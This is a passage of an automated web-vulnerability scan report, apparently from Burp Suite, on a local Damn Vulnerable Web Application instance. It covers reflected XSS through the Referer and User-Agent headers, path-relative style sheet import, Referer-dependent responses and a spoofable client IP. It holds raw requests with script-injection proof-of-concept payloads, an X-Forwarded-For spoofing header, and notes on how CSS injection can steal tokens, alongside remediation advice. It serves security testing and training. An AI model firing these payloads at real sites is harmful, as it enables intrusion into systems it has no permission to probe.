<td><b>/dvwa/vulnerabilities/fi/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>Referer</b> HTTP header is copied into the HTML document as plain text between tags. The payload <b>klwlw&lt;script&gt;alert(1)&lt;/script&gt;d1s3g</b> was submitted in the Referer HTTP header. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a request header, the application's behavior is not trivial to exploit in an attack against another user. In the past, methods have existed of using client-side technologies such as Flash to cause another user to make a request containing an arbitrary HTTP header. If you can use such a technique, you can probably leverage it to exploit the XSS flaw. This limitation partially mitigates the impact of the vulnerability.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/fi/?page=file3.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=a2ri193h7q3jq4eu1ntcl80mmu<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/fi/?page=include.php<span class="HIGHLIGHT">klwlw&lt;script&gt;alert(1)&lt;/script&gt;d1s3g</span><br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:37 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4409<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: File Inclusion :: Damn Vulnerable Web Application (DVWA) <br><b>...[SNIP]...</b><br>&lt;em&gt;http://localhost:7878/dvwa/vulnerabilities/fi/?page=include.php<span class="HIGHLIGHT">klwlw&lt;script&gt;alert(1)&lt;/script&gt;d1s3g</span>&lt;/em&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH2" id="23.5.3">23.5.3.&nbsp;http://localhost:7878/dvwa/vulnerabilities/fi/ [User-Agent HTTP header]</span>
<br><a class="PREVNEXT" href="#23.5.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#23.10.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_low_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Low</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/fi/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>User-Agent</b> HTTP header is copied into the HTML document as plain text between tags. The payload <b>j07t7&lt;script&gt;alert(1)&lt;/script&gt;wo5l2</b> was submitted in the User-Agent HTTP header. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a request header, the application's behavior is not trivial to exploit in an attack against another user. In the past, methods have existed of using client-side technologies such as Flash to cause another user to make a request containing an arbitrary HTTP header. If you can use such a technique, you can probably leverage it to exploit the XSS flaw. This limitation partially mitigates the impact of the vulnerability.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/fi/?page=file3.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=a2ri193h7q3jq4eu1ntcl80mmu<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/fi/?page=include.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<span class="HIGHLIGHT">j07t7&lt;script&gt;alert(1)&lt;/script&gt;wo5l2</span><br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:35 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4409<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: File Inclusion :: Damn Vulnerable Web Application (DVWA) <br><b>...[SNIP]...</b><br>&lt;em&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<span class="HIGHLIGHT">j07t7&lt;script&gt;alert(1)&lt;/script&gt;wo5l2</span>&lt;/em&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="23.6">23.6.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200328_pathrelativestylesheetimport">Path-relative style sheet import</a></span>
<br><a class="PREVNEXT" href="#23.5">Previous</a>
&nbsp;<a class="PREVNEXT" href="#23.7">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/fi/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154: Resource Location Spoofing</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/468.html">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/fi/?page=include.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=ic77v7ifnktm92p700m44fh7i4<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:29:54 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4076<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: File Inclusion :: Damn Vulnerable Web Application (DVWA) <br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/fi/<span class="HIGHLIGHT">index.php/yqtpxn/r230b9/vsukq9/</span>?page=include.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=ic77v7ifnktm92p700m44fh7i4<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:37 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4076<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: File Inclusion :: Damn Vulnerable Web Application (DVWA) <br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/vulnerabilities/fi/index.php/yqtpxn/dvwa/css/main.css</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=ic77v7ifnktm92p700m44fh7i4<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:38 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4076<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: File Inclusion :: Damn Vulnerable Web Application (DVWA) <br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="23.7">23.7.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00400100_refererdependentresponse">Referer-dependent response</a></span>
<br><a class="PREVNEXT" href="#23.6">Previous</a>
&nbsp;<a class="PREVNEXT" href="#23.8">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/fi/</b></td>
</tr>
</table>
<h2>Issue description</h2>
<span class="TEXT"><p>Application responses may depend systematically on the presence or absence of the Referer header in requests. This behavior does not necessarily constitute a security vulnerability, and you should investigate the nature of and reason for the differential responses to determine whether a vulnerability is present.</p>
<p>Common explanations for Referer-dependent responses include: </p>
<ul><li>Referer-based access controls, where the application assumes that if you have arrived from one privileged location then you are authorized to access another privileged location. These controls can be trivially defeated by supplying an accepted Referer header in requests for the vulnerable function.</li><li>Attempts to prevent cross-site request forgery attacks by verifying that requests to perform privileged actions originated from within the application itself and not from some external location. Such defenses are often not robust, and can be bypassed by removing the Referer header entirely.</li>
<li>Delivery of Referer-tailored content, such as welcome messages to visitors from specific domains, search-engine optimization (SEO) techniques, and other ways of tailoring the user's experience. Such behaviors often have no security impact; however, unsafe processing of the Referer header may introduce vulnerabilities such as SQL injection and cross-site scripting. If parts of the document (such as META keywords) are updated based on search engine queries contained in the Referer header, then the application may be vulnerable to persistent code injection attacks, in which search terms are manipulated to cause malicious content to appear in responses served to other application users.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The Referer header is not a robust foundation on which to build access controls. Any such measures should be replaced with more secure alternatives that are not vulnerable to Referer spoofing.</p>
<p>If the contents of responses is updated based on Referer data, then the same defenses against malicious input should be employed here as for any other kinds of user-supplied data. </p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/213.html">CWE-213: Intentional Information Exposure</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/fi/?page=file3.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=a2ri193h7q3jq4eu1ntcl80mmu<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br><span class="HIGHLIGHT">Referer: http://localhost:7878/dvwa/vulnerabilities/fi/?page=include.php</span><br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:40 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: <span class="HIGHLIGHT">4374</span><br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: File Inclusion :: Damn Vulnerable Web Application (DVWA) <br><b>...[SNIP]...</b><br>&lt;br /&gt;<span class="HIGHLIGHT">You came from: </span>&lt;em&gt;<span class="HIGHLIGHT">http://localhost:7878/dvwa/vulnerabilities/fi/?page=include.php</span>&lt;/em&gt;&lt;br /&gt;I'm hosted at: <span class="HIGHLIGHT">&lt;em&gt;localhost:7878&lt;/em&gt;&lt;br /&gt;</span>&lt;br /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/fi/?page=file3.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=a2ri193h7q3jq4eu1ntcl80mmu<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:40 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: <span class="HIGHLIGHT">4281</span><br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: File Inclusion :: Damn Vulnerable Web Application (DVWA) <br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="23.8">23.8.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00400110_spoofableclientipaddress">Spoofable client IP address</a></span>
<br><a class="PREVNEXT" href="#23.7">Previous</a>
&nbsp;<a class="PREVNEXT" href="#23.9">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/fi/</b></td>
</tr>
</table>
<h2>Issue description</h2>
<span class="TEXT"><p>
If an application trusts an HTTP request header like X-Forwarded-For to accurately specify the remote IP address of the connecting client, then malicious clients can spoof their IP address. This behavior does not necessarily constitute a security vulnerability, however some applications use client IP addresses to enforce access controls and rate limits. For example, an application might expose administrative functionality only to clients connecting from the local IP address of the server, or allow a certain number of failed login attempts from each unique IP address.
Consider reviewing relevant functionality to determine whether this might be the case. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>HTTP request headers such as X-Forwarded-For, True-Client-IP, and X-Real-IP are not a robust foundation on which to build any security measures, such as access controls. Any such measures should be replaced with more secure alternatives that are not vulnerable to spoofing.</p>
<p>If the platform application server returns incorrect information about the client's IP address due to the presence of any particular HTTP request header, then the server may need to be reconfigured, or an alternative method of identifying clients should be used. </p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/fi/?page=file3.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=a2ri193h7q3jq4eu1ntcl80mmu<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/fi/?page=include.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:41 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: <span class="HIGHLIGHT">4374</span><br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: File Inclusion :: Damn Vulnerable Web Application (DVWA) <br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/fi/?page=file3.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=a2ri193h7q3jq4eu1ntcl80mmu<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/fi/?page=include.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><span class="HIGHLIGHT">X-Forwarded-For: 127.0.0.1</span><br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:41 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: <span class="HIGHLIGHT">4413</span><br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: File Inclusion :: Damn Vulnerable Web Application (DVWA) <br><b>...[SNIP]...</b><br>&lt;br /&gt;<span class="HIGHLIGHT">Forwarded for: </span>&lt;em&gt;<span class="HIGHLIGHT">127.0.0.1</span>&lt;/em&gt;<br><b>...[SNIP]...</b><br>&lt;br /&gt;I'm hosted at: <span class="HIGHLIGHT">&lt;em&gt;localhost:7878&lt;/em&gt;&lt;br /&gt;</span>&lt;br /&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
